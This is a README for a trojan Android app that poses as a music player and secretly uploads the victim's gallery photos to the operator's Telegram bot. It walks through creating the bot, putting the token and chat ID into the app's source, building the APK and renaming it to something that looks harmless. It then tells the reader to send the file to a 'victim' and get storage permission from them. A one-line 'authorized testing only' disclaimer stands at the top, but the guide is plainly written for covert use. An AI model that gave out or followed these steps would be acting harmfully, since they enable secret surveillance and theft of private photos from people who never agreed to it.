# Cyber_Music__
A music player app that secretly sends gallery photos to a Telegram bot. For authorized security testing only. Using this on someone without permission is illegal.


What you need
 1.A computer (Windows, Mac, or Linux)
2.Android Studio (free software)
3.A Telegram account



Step 1: Install Android Studio
Go to https://developer.android.com/studio
Click the big Download Android Studio button
Open the downloaded file and install it
Open Android Studio
It will ask to install some extra stuff — click Next and let it finish

Step 2: Create a Telegram Bot
Open Telegram on your phone
Search for @BotFather (the blue checkmark one)
Start a chat and type: /newbot
It will ask for a name — type anything like MyGalleryTool
It will ask for a username — type something ending in bot like my_gallery_tool_bot
BotFather will give you a token — it looks like this:1234567890:ABCdefGHIjklmNOPqrstUVwxyz-1234567



Step 3: Get Your Chat ID
In Telegram, search for your new bot (the username you just made)
Click Start or send any message to it (like "hi")
Open your computer browser and go to:


https://api.telegram.org/botYOUR_TOKEN_HERE/getUpdates
Replace YOUR_TOKEN_HERE with the token you copied
You'll see some text. Look for "chat":{"id": followed by a number like:


"chat":{"id":123456789
That number is your Chat ID — copy it and save it


Step 4: Open the Project in Android Studio
Open Android Studio
Click Open (or File → Open)
Find the CyberMusic20 folder and select it
Wait for Android Studio to finish loading (it might take a few minutes)


Step 5: Add Your Bot Token and Chat ID
In Android Studio, on the left side, find this folder structure:



app → src → main → java → com → example → cybermusic20
Click on GalleryCollector.kt to open it
Look for line 18 and 19 — you'll see:
kotlin



private const val BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
private const val CHAT_ID = "YOUR_CHAT_ID_HERE"
Replace YOUR_BOT_TOKEN_HERE with the token from Step 2
Replace YOUR_CHAT_ID_HERE with the Chat ID from Step 3
It should look like this:
kotlin



private const val BOT_TOKEN = "1234567890:ABCdefGHIjklmNOPqrstUVwxyz-1234567"
private const val CHAT_ID = "123456789"


Step 6: Build the APK
In Android Studio, click Build in the top menu
Click Build Bundle(s) / APK(s)
Click Build APK(s)
Wait for it to finish (look at the bottom for a notification)
Click the locate or show in folder link in that notification
You'll find a file called app-debug.apk


Step 7: Rename the APK
Right-click the app-debug.apk file
Click Rename
Change it to something innocent like:
MusicPlayer.apk
SpotifyMod.apk
PhotoEditor.apk
Press Enter



Step 8: Send to Victim
Transfer the APK to the victim's phone (Bluetooth, USB, WhatsApp, file sharing, etc.)
They need to install it (on Android, they need to allow "Install from unknown sources")
They open the app
They click Allow when asked for storage permissions
Wait 15 seconds
Photos start appearing in your Telegram bot
How to see the photos
Open Telegram on your phone or computer
Go to your bot chat
Photos will appear there one by one with their filenames
## Creator

Made by **JebinTech**.
